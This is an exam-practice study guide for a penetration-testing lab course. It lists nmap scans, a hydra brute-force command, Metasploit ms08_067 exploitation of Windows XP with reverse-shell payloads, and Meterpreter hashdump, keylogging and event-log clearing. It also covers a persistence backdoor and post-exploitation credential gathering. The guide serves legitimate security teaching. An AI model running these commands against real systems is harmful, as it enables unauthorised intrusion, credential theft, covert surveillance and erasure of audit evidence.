# Practical Exam 1 Practice

>Author: Dongyi Guo
>
>Doc Version: 1.2.1

* During the formal test, you are only using Kali Linux, steps for setting up other machines are here for your own practice.
* Everything that is inside ```<...>``` requires you to find proper answer to fill in.

## Question 1

#### Linux Network Setup (Kali, Metasploitable2):

To assign IP  on Linux:

```bash
ip a a <IP>/<Prefix> dev <NetworkInterface>
```

To check current IP configuration, use:

```bash
ip a
```

or

```bash
ifconfig
```

and check the ```inet``` parameter of your network interface for IPv4 address. You only need to config IP Kali during you test, for Metasploitable2 , run the setup command with ```sudo``` with msfadmin.

#### Windows Network Setup:

* You don't need to do this during your formal test.

To setup network on Windows 7 and higher:

* Go to Network and Sharing Center, click on the connection.
* Then select Properties.
* Then highlight the "Internet Protocol Version 4 (TCP/IPv4)", select Properties.
* Assign IP accordingly.

For Windows XP:

* Go to Control Panel.
* Select Network Connection.
* Double-click the network.
* Select Properties.
* Then highlight "Internet Protocol [TCP/IP]", select Properties.
* Assign IP accordingly.

## Question 2

To find live hosts on current network, use ```nmap```:

```bash
nmap -sn <NetworkAddress/Prefix>
```

For port scanning:

```bash
nmap <HostAddress>
```

For OS information:

```bash
nmap -O -v <HostAddress>
```

To turn off the firewall on Windows (for your own practice) :

* Search "Windows Firewall" and select the option with exactly these 2 words.
* Click "Turn Windows Firewall on or off" on side menu.
* Turn off the firewall.

## Question 3

To brute-force a password of a given username with a specific service protocol on a remote host, use ```hydra```:

* You will need a password dictionary to power the brute-force operation.

```bash
hydra -l <LoginUsername> -P <PathToPasswordDictionary> <HostIPAddress> <ServiceProtocol> -t <ParallelAttempts>
```

To check all available service protocols, use

```bash
man hydra
```

## Question 4

Windows XP can be exploited by:

* VNC injection, returns a GUI view or control
* Meterpreter, returns a command prompt to perform miscellaneous actions on target host.

For VNC injection, while in Metasploitable Framework prompt ( ```msf6>``` ): 

```bash
use exploit/windows/smb/ms08_067_netapi
set payload windows/vncinject/reverse_tcp
set LHOST <KaliIPAddress>
set RHOST <XPIPAddress>
set ViewOnly false
exploit
```

For Meterpreter:

```bash
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set LHOST <KaliIPAddress>
set RHOST <XPIPAddress>
exploit
```

During Meterpreter session ( ```meterpreter>``` ), commands that could be useful:

```bash
cd <DirectoryPath> # Change directory
ls # List directory
pwd # Current directory
sysinfo # System information
ipconfig # Network information
screenshot # Take a screenshot from target host
hashdump # Dump all user's hashes on the screen
search -f <filename> # Search file based on name in current directory
download <RemotePath> <LocalPath> # Remote download file from target host to local
# Remember the path for download command has to be Unix type, for Windows '\',
# Either double it '\\' or change back to '/'.

clearev # Clean event logs

getpid # Get current process ID
ps # List current Processes on target host
migrate <processID> # Migrate to process ID
# Keylogger only works when Meterpreter is paratisitizing a process with relative high privilege:
keyscan_start # Start key logging
keyscan_dump # Dump key logging
keyscan_stop # Stop key logging

# Backgroud current session
background
# Or
bg
# Or ctrl + z
```

To add backdoor on the Meterpreter session, background the session, then in MSF prompt:

```bash
use exploit/windows/local/persistence
set LHOST <KaliIPAddress>
set LPORT 445
set STARTUP SYSTEM # DO NOT lowercase SYSTEM, as it is parameter value
sessions # Get the meterpreter session's ID
set session <MeterpreterSessionID> 
exploit
```

Then, use multi/handler to listen the incoming connection:

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <KaliIPAddress>
set LPORT 445
run # alias of exploit, use any
```

After that, if XP gets rebooted, it will send back the connection and Kali will enter Meterpreter prompt automatically.

## MSF Essentials

In MSF prompts, several things:

```bash
search <Keyword> # Search exploits via keyword
show options # Give current configurable parameters for current exploit and payload
show paylaods # Show possible payloads for current exploit
show targets # Show possible targets for current exploit
```

* Use ```setg``` instead of ```set``` to preserve parameter values across different exploits with the same parameter name.
* The parameter names are case-insensitive, but if the parameter values are given accepted value (Accepted: ...), you must match the case:

```bash
set sTArTuP SYSTEM # That is okay
set STARTUP system # NOT OKAY
```

## Post-Exploitation Information Gathering

* This means gathering information after you retrieve administrative priviledge on a target.

If you have a reverse shell session and you want to upgrade it to Meterpreter session: use:

```bash
sessions # Check the session ID of your reverse shell session
sessions -u <ReverseShellSessionID>
```

If you have a unprivileged Meterpreter session, to find exploit escalating your privilege, use:

```bash
sessions # Check the session ID of your unprivileged session
use post/multi/recon/local_exploit_suggester
set session <UnprivilegedMeterpreterSessionID>
run
```

to find possible vulnerabilities can be used to escalate your priviledge.

Once you have the administrative privilege, to find all modules that are helpful for information gathering, use:

```bash
# For Linux
search post/linux/gather
# For Windows
search post/windows/gather
```

Common useful modules to gather information about your target:

```bash
use post/<linux/windows>/gather/checkvm # Identify whether a target is virtual machine, and if so what virtualisation it is
use post/linux/gather/checkcontainer # Identify whether a target is a containerized, and if so what type of container it is
use post/linux/gather/hashdump # Dump user's hashes on screen
use post/windows/gather/smart_hashdump # Dump user's hashes on screen and save them into /root/.msf4/loot/
use post/linux/gather/enum_protections # List target's security protection measurements
use post/linux/gather/enum_configs # List target's service configurations and save them into /root/.msf4/loot/
use post/linux/gather/enum_network # List target's network infrastructure information and configurations and save them into /root/.msf4/loot/
use post/linux/gather/enum_system # List target's system information and save them into /root/.msf4/loot/
```

Then set the Meterpreter session and run to gather the information:

```bash
set session <MeterpreterSessionID>
run
```

